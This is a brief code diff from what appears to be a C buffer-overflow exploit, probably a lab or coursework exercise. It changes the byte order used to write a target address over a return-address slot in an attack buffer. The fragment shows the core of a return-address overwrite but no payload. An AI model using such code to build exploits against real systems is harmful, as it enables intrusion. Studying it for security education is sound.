@@ -32,10 +32,10 @@ main ( int argc, char * argv[] )
 	// for(int i = 0; i < 6; i++){
 	// 	*(attack_buffer+120+i) = ptr[i];
 	// }
-	attack_buffer[BUF_TO_RET] = (char) (target & 0x000000ff);
-	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 8) & 0x000000ff);
-	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 16) & 0x000000ff);
-	attack_buffer[BUF_TO_RET + 3] = (char) ((target >> 24) & 0x000000ff);
+	attack_buffer[BUF_TO_RET + 3] = (char) (target & 0x000000ff);
+	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 8) & 0x000000ff);
+	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 16) & 0x000000ff);
+	attack_buffer[BUF_TO_RET] = (char) ((target >> 24) & 0x000000ff);
 
 	//memcpy(&attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof(char *));
 
